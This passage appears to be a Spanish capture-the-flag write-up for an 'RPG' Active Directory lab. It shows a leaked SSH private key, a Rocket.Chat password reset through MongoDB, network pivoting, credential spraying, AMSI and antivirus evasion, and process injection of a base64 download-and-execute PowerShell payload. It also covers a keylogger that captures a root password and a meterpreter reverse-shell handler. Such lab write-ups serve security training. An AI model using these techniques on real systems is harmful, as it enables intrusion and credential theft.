+jMdS6sECgYEAg9AhMsjpYZs5TAm3z8OaRoQMOndX0DGrqsOVtOc38vxWihiUsaVq
+aXM9ciStPc4OnIReQyet5u1BSrKux4DCjtpf7JxNrFdSB6lbyVIu/jWrTXiP9dfD
+XlWHR1siUlJmdvbPtgp9+YQ4pDUWkbG9uOPXWgkvGnXGfqugbIvVgPo=
+-----END RSA PRIVATE KEY-----</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Antes se hablaba del usuario <code class="language-plaintext highlighter-rouge">beta_user</code> que necesitaba una clave para acceder, al conectarnos a <code class="language-plaintext highlighter-rouge">ssh</code> como este proporcionando la <code class="language-plaintext highlighter-rouge">id_rsa</code> obtenemos una shell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ssh </span><span class="p">beta_user@10.13.38.18 -i id_rsa
+</span><span class="ve">beta_user@Ignis</span><span class="p">:</span><span class="az">~</span><span class="p">$ id
+uid=1002(beta_user) gid=1002(beta_user) groups=1002(beta_user)
+</span><span class="ve">beta_user@Ignis</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I
+10.13.38.18 192.168.125.135 172.17.0.1 dead:beef::250:56ff:fe07:4590  
+</span><span class="ve">beta_user@Ignis</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya dentro de la maquina podemos acceder a la db de <code class="language-plaintext highlighter-rouge">mongo</code> que se utiliza para gestionar de la web de <code class="language-plaintext highlighter-rouge">rocket chat</code>, en ella encontramos 3 dbs, usaremos <code class="language-plaintext highlighter-rouge">parties</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">beta_user@Ignis</span><span class="p">:</span><span class="az">/snap/rocketchat-server/1427/bin</span><span class="p">$ ./mongo
+MongoDB shell version v3.6.14
+connecting to: mongodb://127.0.0.1:27017/?gssapiServiceName=mongodb
+Implicit session: session { "id" : UUID("87397f7a-ad2b-42b1-8aa0-77784876b82a") }
+MongoDB server version: 3.6.14
+Welcome to the MongoDB shell.
+For interactive help, type "help".
+For more comprehensive documentation, see
+	http://docs.mongodb.org/
+Questions? Try the support group
+	http://groups.google.com/group/mongodb-user
+Server has startup warnings: 
+2023-08-25T00:06:02.664+0000 I STORAGE  [initandlisten] 
+2023-08-25T00:06:02.664+0000 I STORAGE  [initandlisten] ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine  
+2023-08-25T00:06:02.664+0000 I STORAGE  [initandlisten] **          See http://dochub.mongodb.org/core/prodnotes-filesystem
+2023-08-25T00:06:07.539+0000 I CONTROL  [initandlisten] 
+2023-08-25T00:06:07.539+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
+2023-08-25T00:06:07.539+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
+2023-08-25T00:06:07.539+0000 I CONTROL  [initandlisten] ** WARNING: You are running this process as the root user, which is not recommended.
+2023-08-25T00:06:07.539+0000 I CONTROL  [initandlisten] 
+rs0:PRIMARY> show dbs  
+admin    0.000GB
+config   0.000GB
+local    0.031GB
+parties  0.010GB
+rs0:PRIMARY> use parties
+switched to db parties
+rs0:PRIMARY></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En la <a href="https://docs.rocket.chat/setup-and-configure/advanced-workspace-management/restoring-an-admin">documentacion</a> de rocket chat se nos muestra una forma de cambiar la contraseña de un usuario a traves de mongdb, cambiaremos la de <code class="language-plaintext highlighter-rouge">dev-admin</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">rs0:PRIMARY> db.users.update({"username": "dev-admin"}, {$set:{"services.password.bcrypt":"$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG"}})  
+WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
+rs0:PRIMARY></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora podemos acceder a la interfaz como <code class="language-plaintext highlighter-rouge">dev-admin</code> y la contraseña <code class="language-plaintext highlighter-rouge">12345</code></p>
+<a href="/endgames/rpg/12.png" target="_blank"><div><p><img src="/endgames/rpg/12.png"></p></div></a>
+
+<a href="/endgames/rpg/13.png" target="_blank"><div><p><img src="/endgames/rpg/13.png"></p></div></a>
+
+<p class="plain-text">En el canal <code class="language-plaintext highlighter-rouge">onboarding_information</code> el usuario roundsoft_hr da informacion sobre el sitio y muestra una <code class="language-plaintext highlighter-rouge">contraseña</code> por defecto que tal vez podriamos utilizar</p>
+<a href="/endgames/rpg/14.png" target="_blank"><div><p><img src="/endgames/rpg/14.png"></p></div></a>
+
+<p class="plain-text">Un poco mas abajo encontramos un hilo creado por <code class="language-plaintext highlighter-rouge">janderson</code> ya que su contraseña no funciona, la respuesta es que esta ha cambiado y se proporciona la <code class="language-plaintext highlighter-rouge">nueva</code></p>
+<a href="/endgames/rpg/33.png" target="_blank"><div><p><img src="/endgames/rpg/33.png"></p></div></a>
+
+<p class="plain-text">Sabemos que existen varios <code class="language-plaintext highlighter-rouge">equipos</code> en donde podriamos probar autenticarnos, despues de un escaneo con <code class="language-plaintext highlighter-rouge">nmap</code> de los hosts que conocemos podemos idenfiticar a la <code class="language-plaintext highlighter-rouge">.128</code> como DC y la <code class="language-plaintext highlighter-rouge">.88</code> junto a la <code class="language-plaintext highlighter-rouge">.129</code> como maquinas asociadas al dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">beta_user@Ignis</span><span class="p">:</span><span class="az">~</span><span class="p">$ ./nmap -T5 -Pn -n 192.168.125.88  
+Nmap scan report for 192.168.125.88
+PORT      STATE SERVICE
+80/tcp    open  http
+135/tcp   open  loc-srv
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+5985/tcp  open  unknown
+8040/tcp  open  unknown
+8045/tcp  open  unknown
+8081/tcp  open  tproxy
+</span><span class="ve">beta_user@Ignis</span><span class="p">:</span><span class="az">~</span><span class="p">$ ./nmap -T5 -Pn -n 192.168.125.128  
+Nmap scan report for 192.168.125.128
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos
+135/tcp   open  loc-srv
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd
+593/tcp   open  unknown
+636/tcp   open  ldaps
+3268/tcp  open  unknown
+3269/tcp  open  unknown
+5985/tcp  open  unknown
+9389/tcp  open  unknown
+</span><span class="ve">beta_user@Ignis</span><span class="p">:</span><span class="az">~</span><span class="p">$ ./nmap -T5 -Pn -n 192.168.125.129  
+Nmap scan report for 192.168.125.129
+PORT      STATE SERVICE
+135/tcp   open  loc-srv
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+3389/tcp  open  unknown
+5985/tcp  open  unknown
+</span><span class="ve">beta_user@Ignis</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para tener conexion desde nuestro equipo podemos usar <a href="https://github.com/nicocha30/ligolo-ng/">ligolo-ng</a> usando el <code class="language-plaintext highlighter-rouge">agent</code> para conectarnos a nuestro equipo por el puerto <code class="language-plaintext highlighter-rouge">11601</code> que nos marca el <code class="language-plaintext highlighter-rouge">proxy</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">beta_user@Ignis</span><span class="p">:</span><span class="az">~</span><span class="p">$ </span><span class="p">./agent -connect 10.10.14.10:11601 -ignore-cert &
+</span><span class="am">WARN</span><span class="p">[0000] warning, certificate validation disabled     
+</span><span class="az">INFO</span><span class="p">[0000] Connection established                 </span><span class="az">addr</span><span class="p">="10.10.14.10:11601"  
+</span><span class="ve">beta_user@Ignis</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En el proxy obtenemos una <code class="language-plaintext highlighter-rouge">sesión</code>, la indicamos e iniciamos el tunel con <code class="language-plaintext highlighter-rouge">start</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ./proxy </span><span class="p">-selfcert
+</span><span class="am">WARN</span><span class="p">[0000] Using automatically generated self-signed certificates (Not recommended)  
+</span><span class="az">INFO</span><span class="p">[0000] Listening on 0.0.0.0:11601</span><span class="am">
+    __    _             __                       
+   / /   (_)___ _____  / /___        ____  ____ _
+  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
+ / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
+/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
+        /____/                          /____/   
+
+Made in France ♥ by @Nicocha30!
+
+ligolo-ng » 
+</span><span class="az">INFO</span><span class="p">[0011] Agent joined.    </span><span class="az">name</span><span class="p">=beta_user@Ignis </span><span class="az">remote</span><span class="p">="10.13.38.18:43462"
+</span><span class="am">ligolo-ng » </span><span class="p">session
+</span><span class="ve">? </span><span class="p">Specify a session : </span><span class="az">1 - beta_user@Ignis - 10.13.38.18:43462
+</span><span class="am">[Agent : beta_user@Ignis] » </span><span class="p">start
+</span><span class="az">INFO</span><span class="p">[0014] Starting tunnel to beta_user@Ignis           
+</span><span class="am">[Agent : beta_user@Ignis] »</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Agregamos el segmento <code class="language-plaintext highlighter-rouge">192.168.125.0/24</code> a la interfaz de <code class="language-plaintext highlighter-rouge">ligolo</code> y ahora tenemos conexión con todos los equipos del dominio, podemos comprobarlo con un ping</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo ip </span><span class="p">route add 192.168.125.0/24 dev ligolo
+
+</span><span class="ve">❯ ping</span><span class="p"> -c1 -w1 192.168.125.128
+PING 192.168.125.128 (192.168.125.128) 56(84) bytes of data.
+64 bytes from 192.168.125.128: icmp_seq=1 ttl=64 time=164 ms  
+
+--- 192.168.125.128 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 163.769/163.769/163.769/0.000 ms</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Despues de configurar <code class="language-plaintext highlighter-rouge">ligolo</code> logramos tener <code class="language-plaintext highlighter-rouge">conexión</code> con los tres equipos windows, con <code class="language-plaintext highlighter-rouge">crackmapexec</code> podemos ver los nombres de equipos del dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 192.168.125.88-129
+</span><span class="az">SMB         </span><span class="p">192.168.125.88  445    GELUS            </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:GELUS) (domain:Roundsoft.local) (signing:False) (SMBv1:False)
+</span><span class="az">SMB         </span><span class="p">192.168.125.128 445    SHINRA           </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">192.168.125.129 445    LUX              </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 18362 x64 (name:LUX) (domain:Roundsoft.local) (signing:False) (SMBv1:False)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Por comodidad y posibles proximos ataques agregaremos al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> las direcciones con su <code class="language-plaintext highlighter-rouge">dominio</code> que sera el <code class="language-plaintext highlighter-rouge">hostname</code> y el dominio <code class="language-plaintext highlighter-rouge">roundsoft.local</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ tail</span><span class="p"> -n3 /etc/hosts
+192.168.125.88 gelus.roundsoft.local
+192.168.125.128 shinra.roundsoft.local roundsoft.local  
+192.168.125.129 lux.roundsoft.local</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos comprobar la contraseña que recibio el usuario <code class="language-plaintext highlighter-rouge">janderson</code> a traves de el chat contra <code class="language-plaintext highlighter-rouge">SHINRA</code> que es el <code class="language-plaintext highlighter-rouge">DC</code>, las credenciales son validas a nivel de dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb shinra.roundsoft.local -u janderson -p Welcome_roundsoft2019!
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="ve">[+] </span><span class="p">Roundsoft.local\janderson:Welcome_roundsoft2019!</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos probar las credenciales para el protocolo <code class="language-plaintext highlighter-rouge">winrm</code> hacia todos los equipos del dominio, todos devuelven error excepto el host <code class="language-plaintext highlighter-rouge">.129</code> que devuelve un <code class="language-plaintext highlighter-rouge">Pwn3d!</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">winrm 192.168.125.88-129 -u janderson -p Welcome_roundsoft2019!
+</span><span class="az">SMB         </span><span class="p">192.168.125.88  5985   GELUS            </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 (name:GELUS) (domain:Roundsoft.local)
+</span><span class="az">SMB         </span><span class="p">192.168.125.128 5985   SHINRA           </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 14393 (name:SHINRA) (domain:Roundsoft.local)  
+</span><span class="az">SMB         </span><span class="p">192.168.125.129 5985   LUX              </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 18362 (name:LUX) (domain:Roundsoft.local)
+</span><span class="az">HTTP        </span><span class="p">192.168.125.88  5985   GELUS            </span><span class="az">[*] </span><span class="p">http://192.168.125.88:5985/wsman
+</span><span class="az">HTTP        </span><span class="p">192.168.125.128 5985   SHINRA           </span><span class="az">[*] </span><span class="p">http://192.168.125.128:5985/wsman
+</span><span class="az">HTTP        </span><span class="p">192.168.125.129 5985   LUX              </span><span class="az">[*] </span><span class="p">http://192.168.125.129:5985/wsman
+</span><span class="az">HTTP        </span><span class="p">192.168.125.88  5985   GELUS            </span><span class="ro">[-] </span><span class="p">Roundsoft.local\janderson:Welcome_roundsoft2019! 
+</span><span class="az">HTTP        </span><span class="p">192.168.125.128 5985   SHINRA           </span><span class="ro">[-] </span><span class="p">Roundsoft.local\janderson:Welcome_roundsoft2019! 
+</span><span class="az">HTTP        </span><span class="p">192.168.125.129 5985   LUX              </span><span class="ve">[+] </span><span class="p">Roundsoft.local\janderson:Welcome_roundsoft2019! </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Simplemente nos conectamos haciendo uso de <code class="language-plaintext highlighter-rouge">evil-winrm</code> al equipo <code class="language-plaintext highlighter-rouge">LUX</code> donde las credenciales son validas y obtenemos una powershell como el usuario <code class="language-plaintext highlighter-rouge">janderson</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm</span><span class="p"> -i lux.roundsoft.local -u janderson -p Welcome_roundsoft2019!  
+PS C:\Users\janderson\Documents> </span><span class="am">whoami</span><span class="p">
+roundsoft\janderson
+PS C:\Users\janderson\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Aunque el antivirus esta activo y el <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">winpeas</a> normal se borrara al subirlo podemos usar la version <code class="language-plaintext highlighter-rouge">ofuscada</code> de este para asi bypassearlo y se ejecute normalmente</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\janderson\Documents> </span><span class="am">upload </span><span class="p">winpeas_ofs.exe
+</span><span class="az">
+Info: Uploading winpeas_ofs.exe to C:\Users\janderson\Documents\winpeas_ofs.exe  
+</span><span class="sa">
+Data: 2979156 bytes of 2979156 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\Users\janderson\Documents> </span><span class="am">.\winpeas_ofs.exe</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Entre las cosas que nos muestra podemos encontrar 2 que llaman la atencion, y es una sesion de <code class="language-plaintext highlighter-rouge">RDP</code> y una session de <code class="language-plaintext highlighter-rouge">Putty</code>, por lo que puede que haya algo en ella</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="az">╔══════════╣ </span><span class="ve">RDP Sessions
+    </span><span class="c1">SessID    pSessionName   pUserName      pDomainName              State     SourceIP  
+    </span><span class="p">1                        </span><span class="sa">janderson      ROUNDSOFT                </span><span class="p">Disconnected</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="az">╔══════════╣ </span><span class="ve">Putty SSH Host keys
+</span><span class="ro">    ssh-ed25519@22:192.168.125.135:  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Lo primero que haremos despues de bypassear el <code class="language-plaintext highlighter-rouge">amsi</code> sera subir un <a href="https://github.com/ivan-sincek/keylogger">keylogger</a> que detectara todas las pulsaciones en la sesion y las guardara en un archivo <code class="language-plaintext highlighter-rouge">.log</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\janderson\Documents> </span><span class="am">Bypass-4MSI
+</span><span class="az">
+Info: Patching 4MSI, please be patient...
+</span><span class="ve">
+[+] Success!
+</span><span class="p">
+PS C:\Users\janderson\Documents> </span><span class="am">upload </span><span class="p">Keylogger_x64.exe
+</span><span class="az">
+Info: Uploading Keylogger_x64.exe to C:\Users\janderson\Documents\Keylogger_x64.exe  
+</span><span class="sa">
+Data: 48468 bytes of 48468 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\Users\janderson\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sin embargo, no podemos hacerlo desde el contexto actual sino <code class="language-plaintext highlighter-rouge">migrar</code> a un proceso de la sesión, para ello podemos usar <a href="https://github.com/EmpireProject/PSInject/">Invoke-PSInject</a>, sin embargo al intentar importarlo nos dice que la ejecucion <code class="language-plaintext highlighter-rouge">scripts</code> estan deshabilitada en el sistema</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\janderson\Documents> </span><span class="am">upload </span><span class="p">Invoke-PSInject.ps1
+</span><span class="az">
+Info: Uploading Invoke-PSInject.ps1 to C:\Users\janderson\Documents\Invoke-PSInject.ps1
+</span><span class="sa">
+Data: 682728 bytes of 682728 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\Users\janderson\Documents> </span><span class="am">Import-Module</span><span class="p"> .\Invoke-PSInject.ps1
+</span><span class="ro">File C:\Users\janderson\Documents\Invoke-PSInject.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.  
+At line:1 char:1
++ Import-Module .\Invoke-PSInject.ps1
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : SecurityError: (:) [Import-Module], PSSecurityException
+    + FullyQualifiedErrorId : UnauthorizedAccess,Microsoft.PowerShell.Commands.ImportModuleCommand</span><span class="p">
+PS C:\Users\janderson\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos aprovechar el parametro <code class="language-plaintext highlighter-rouge">-s</code> incluido en <code class="language-plaintext highlighter-rouge">evil-winrm</code> para bypassear esta restriccion indicando una ruta para los <code class="language-plaintext highlighter-rouge">scripts</code> para despues llamarlos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm</span><span class="p"> -i lux.roundsoft.local -u janderson -p Welcome_roundsoft2019! -s .  
+PS C:\Users\janderson\Documents> </span><span class="am">Invoke-PSInject.ps1</span><span class="p">
+PS C:\Users\janderson\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usaremos <a href="https://github.com/besimorhino/powercat/">powercat</a>, agregaremos una linea para que abra el puerto <code class="language-plaintext highlighter-rouge">4444</code> y ejecute una powershell, sin embargo el <code class="language-plaintext highlighter-rouge">antivirus</code> detecta la string <code class="language-plaintext highlighter-rouge">powercat</code> como maliciosa, podemos simplemente cambiarlo por <code class="language-plaintext highlighter-rouge">pocat</code> para que no lo detecte</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="am">'powercat -l -p 4444 -e powershell' </span><span class="p">>> powercat.ps1  
+
+</span><span class="ve">❯ sed</span><span class="p"> -i</span><span class="am"> 's/powercat/pocat/' </span><span class="p">powercat.ps1</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora subiremos el script a la maquina <code class="language-plaintext highlighter-rouge">ignis</code> que tenemos ya que la maquina no tiene conexion directa con nosotros, en ella iniciaremos un servidor <code class="language-plaintext highlighter-rouge">http</code> con python</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ scp</span><span class="p"> -i id_rsa pocat.ps1 beta_user@10.13.38.18:.  </span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">beta_user@Ignis</span><span class="p">:</span><span class="az">~</span><span class="p">$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Tambien crearemos un payload en <code class="language-plaintext highlighter-rouge">base64</code> para que en caso de ser ejecutado haga una peticion hacia el script <code class="language-plaintext highlighter-rouge">pocat.ps1</code> que compartimos y lo interprete con <code class="language-plaintext highlighter-rouge">IEX</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo</span><span class="p"> -n </span><span class="am">"powershell -c 'IWR 192.168.125.135:8080/pocat.ps1 | IEX'" </span><span class="p">| </span><span class="ve">iconv </span><span class="p">-t utf16le | </span><span class="ve">base64</span><span class="p"> -w0
+cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgACcASQBXAFIAIAAxADkAMgAuADEANgA4AC4AMQAyADUALgAxADMANQA6ADgAMAA4ADAALwBwAG8AYwBhAHQALgBwAHMAMQAgAHwAIABJAEUAWAAnAA==  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora tomaremos el <code class="language-plaintext highlighter-rouge">pid</code> de proceso de la sesion donde inyectaremos el payload, en este caso usaremos el proceso <code class="language-plaintext highlighter-rouge">RuntimeBroker</code> que pertenece al pid <code class="language-plaintext highlighter-rouge">2852</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\janderson\Documents> </span><span class="am">Get-Process </span><span class="p">RuntimeBroker
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+    142       9     2060       4268       0.09   2852   1 RuntimeBroker  
+    564      26    12720      17760              3392   4 RuntimeBroker  
+    410      19     6432      14360       1.45   5036   1 RuntimeBroker  
+    423      23     8528      12144       0.70   5804   1 RuntimeBroker  
+    138       8     1532       1272       0.06   6492   1 RuntimeBroker  
+    269      14     3044      10720       1.61   6944   1 RuntimeBroker  
+    329      17     4292       4464              8444   4 RuntimeBroker  
+    239      13     2748       8816              9068   4 RuntimeBroker  
+    138       8     1524       1388              9588   4 RuntimeBroker  
+    213      12     2556       2572              9608   4 RuntimeBroker  
+    142       9     2000       8072             10284   4 RuntimeBroker  
+    189      13     4756      14460             10568   4 RuntimeBroker  
+    297      17     5112      17172       0.31  11020   1 RuntimeBroker  
+
+PS C:\Users\janderson\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Finalmente usamos la funcion <code class="language-plaintext highlighter-rouge">Invoke-PSInject</code> que importamos antes para inyectar nuestro payload en base64 en el pid <code class="language-plaintext highlighter-rouge">2852</code> perteneciente al proceso RuntimeBroker</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\janderson\Documents> </span><span class="am">Invoke-PSInject </span><span class="c1">-Procid </span><span class="p">2852 </span><span class="c1">-PoshCode </span><span class="p">cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgACcASQBXAFIAIAAxADkAMgAuADEANgA4AC4AMQAyADUALgAxADMANQA6ADgAMAA4ADAALwBwAG8AYwBhAHQALgBwAHMAMQAgAHwAIABJAEUAWAAnAA==  
+PS C:\Users\janderson\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al hacerlo recibimos una peticion en el servidor http hacia <code class="language-plaintext highlighter-rouge">/pocat.ps1</code> por lo que el comando se ejecuto correctamente y significa que el <code class="language-plaintext highlighter-rouge">script</code> se ha interpretado</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">beta_user@Ignis</span><span class="p">:</span><span class="az">~</span><span class="p">$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...  
+192.168.125.129 - - "GET /pocat.ps1 HTTP/1.1" 200 -</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora podemos simplemente conectarnos al puerto <code class="language-plaintext highlighter-rouge">4444</code> de la maquina y nos recibe una <code class="language-plaintext highlighter-rouge">powershell</code> de janderson que se abrio al interpretarce el script <code class="language-plaintext highlighter-rouge">pocat.ps1</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ netcat </span><span class="p">lux.roundsoft.local 4444
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.  
+
+PS C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
+roundsoft\janderson
+PS C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Bajo el contexto del proceso <code class="language-plaintext highlighter-rouge">RuntimeBroker</code> ahora podemos ejecutar el <code class="language-plaintext highlighter-rouge">keylogger</code> que subimos antes y dejarlo corriendo en espera de <code class="language-plaintext highlighter-rouge">pulsaciones</code> de la sesion</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\janderson\Documents> </span><span class="am">.\Keylogger_x64.exe  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Despues de algunos segundos que se reinicia la sesion de <code class="language-plaintext highlighter-rouge">putty</code> y el usuario ingresa la contraseña logramos detectar las pulsaciones y por lo tanto la <code class="language-plaintext highlighter-rouge">contraseña</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\janderson\Documents> </span><span class="am">type </span><span class="p">Keylogger_x64.log  
+(03^69<@BHM*/KY4z[ENTER]
+PS C:\Users\janderson\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos conectarnos como <code class="language-plaintext highlighter-rouge">root</code> con esta contraseña a traves de <code class="language-plaintext highlighter-rouge">ssh</code> y leer la flag</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ssh </span><span class="p">root@10.13.38.18 
+root@10.13.38.18's password: (03^69<@BHM*/KY4z
+</span><span class="ve">root@Ignis</span><span class="p">:</span><span class="az">~</span><span class="p"># id
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="ve">root@Ignis</span><span class="p">:</span><span class="az">~</span><span class="p"># hostname -I 
+10.13.38.18 192.168.125.135 172.17.0.1 dead:beef::250:56ff:fe07:4590  
+</span><span class="ve">root@Ignis</span><span class="p">:</span><span class="az">~</span><span class="p"># cat flag.txt 
+RPG{h1j@ckin_lyk_@_pir@t3}
+</span><span class="ve">root@Ignis</span><span class="p">:</span><span class="az">~</span><span class="p">#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Otra forma de hacerlo es con <code class="language-plaintext highlighter-rouge">metasploit</code>, para ello iniciamos creando un listener de <code class="language-plaintext highlighter-rouge">meterpreter</code> por el puerto <code class="language-plaintext highlighter-rouge">4444</code> pero hay que tener algunas cosas en cuenta</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo msfconsole </span><span class="p">-q
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:0) >> use exploit/multi/handler 
+</span><span class="az">[*] </span><span class="p">Using configured payload generic/shell_reverse_tcp
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:0) exploit(</span><span class="ro">multi/handler</span><span class="p">) >> set payload windows/x64/meterpreter/reverse_tcp  
+payload => windows/x64/meterpreter/reverse_tcp
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:0) exploit(</span><span class="ro">multi/handler</span><span class="p">) >> set lhost tun0
+lhost => tun0
